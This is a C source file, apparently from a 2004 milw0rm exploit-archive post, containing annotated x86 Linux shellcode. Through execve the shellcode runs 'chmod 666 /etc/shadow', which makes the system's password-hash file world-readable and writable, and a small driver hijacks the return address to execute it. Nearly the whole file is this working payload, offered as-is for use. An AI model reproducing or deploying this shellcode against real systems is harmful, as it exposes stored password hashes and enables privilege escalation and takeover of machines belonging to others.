/*
 * s0t4ipv6@Shellcode.com.ar
 *
 * Usando execve() y un array de punteros
 *
 *  #include <stdio.h>
 *  main() {
 *       char *name[4];
 *       name[0]="/bin/chmod";
 *       name[1]="666";
 *       name[2]="/etc/shadow";
 *       name[3]=NULL;
 *       execve(name[0],name,NULL);
 *  }
 */

#include <stdio.h>

char shellcode[]=
"\xeb\x31"		//	jmp	0x31			// 3-4
"\x5e"			//	popl	%esi			// 5
"\x31\xc0"		//	xorl	%eax, %eax		// 6-7
"\x88\x46\x0a"		//	movb	%al, 0xa(%esi)		// 8-10
"\x88\x46\x0e"		//	movb	%al, 0xe(%esi)		// 11-13
"\x88\x46\x1a"		//	movb	%al, 0x1a(%esi)		// 14-16
"\x89\x76\x1b"		//	movl	%esi, 0x1b(%esi)	// 17-19
"\x8d\x7e\x0b"		//	leal	0xb(%esi), %edi		// 20-22
"\x89\x7e\x1f"		//	movl	%edi, 0x1f(%esi)	// 23-25
"\x8d\x7e\x0f"		//	leal	0xf(%esi), %edi		// 26-28
"\x89\x7e\x23"		//	movl	%edi, 0x23(%esi)	// 29-31
"\x89\x46\x27"		//	movl	%eax 0x27(%esi)		// 32-34
"\xb0\x0b"		//	movb	$0xb, %al		// 35-36 0xb to eax (syscall execve)
"\x89\xf3"		//	movl	%esi, %ebx		// 37-38 name[0] to ebx
"\x8d\x4e\x1b"		//	leal    0x1b(%esi),%ecx		// 39-41
"\x8d\x56\x27"		//	leal    0x27(%esi),%edx		// 42-44
"\xcd\x80"		//	int	$0x80			// 45-46
"\x31\xc0"		//	xorl	%eax, %eax		// 47-48
"\x31\xdb"		//	xorl    %ebx, %ebx		// 49-50
"\x40"			//	inc	%eax			// 51
"\xcd\x80"		//	int	$0x80			// 52-53
"\xe8\xca\xff\xff\xff"	//	call	-0x36
"/bin/chmod06660/etc/shadow";

main() {
        int *ret;
        ret=(int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(shellcode));
        (*ret) = (int)shellcode;
}

// milw0rm.com [2004-09-26]